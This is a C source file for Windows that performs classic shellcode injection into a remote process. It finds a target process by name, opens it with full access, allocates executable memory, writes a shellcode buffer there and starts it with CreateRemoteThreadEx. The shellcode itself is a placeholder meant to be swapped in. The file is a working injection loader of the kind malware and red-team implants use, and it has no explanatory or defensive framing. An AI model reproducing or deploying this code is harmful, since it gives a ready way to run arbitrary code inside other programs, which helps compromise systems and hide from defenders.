#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "process.h"

unsigned char shellcode[] = 
"\xca\xfe\xba\xbe"; // replace with your shellcode
size_t shellSize = sizeof(shellcode);

int get_process(HANDLE *hProcess, char *name) {
  HANDLE hProcessSnap;
  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hProcessSnap == INVALID_HANDLE_VALUE) {
    warn("Couldnt create a snapshot. Error: %ld", GetLastError());
    return -1;
  }
  if (!Process32First(hProcessSnap, &pe32)) {
    warn("Error with the Process32First. Error: %ld", GetLastError());
    CloseHandle(hProcessSnap);
    return -1;
  }
  do {
    if (!strcmp(pe32.szExeFile, name)) {
      *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
      if (!hProcess) {
        warn("Failed to OpenProcess. Error: %ld", GetLastError());
        CloseHandle(hProcessSnap);
        return -1;
      }
      CloseHandle(hProcessSnap);
      return 0;
    }
  } while (Process32Next(hProcessSnap, &pe32));
  CloseHandle(hProcessSnap);
  return -1;
}

int process_inject(HANDLE hProcess) {
  int *shellBuf;
  HANDLE hThread;
  DWORD tID;

  // Allocating space for the shellcode
  shellBuf = VirtualAllocEx(hProcess, NULL, shellSize,
                            (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
  if (!shellBuf) {
    warn("Failed to VirtualallocEx. Error: %ld", GetLastError());
    return -1;
  }
  okey("Created buffer of size %lld", shellSize);

  // Populating that space with the shellcode
  if (!WriteProcessMemory(hProcess, shellBuf, shellcode, shellSize, NULL)) {
    warn("Failed to WriteProcessMemory. Error: %ld", GetLastError());
    return -1;
  }

  // Create thread
  hThread = CreateRemoteThreadEx(
      hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellBuf, NULL, 0, 0, &tID);
  if (!hThread) {
    warn("Failed to CreateRemoteThreadEx. Error: %ld", GetLastError());
    return -1;
  }
  okey("Created a thread with the shellcode");

  // Waiting for the thread to stop
  WaitForSingleObject(hThread, INFINITE);

  // Cleanup
  if (hThread) {
    info("Closing the thread");
    CloseHandle(hThread);
  }

  return 0;
}
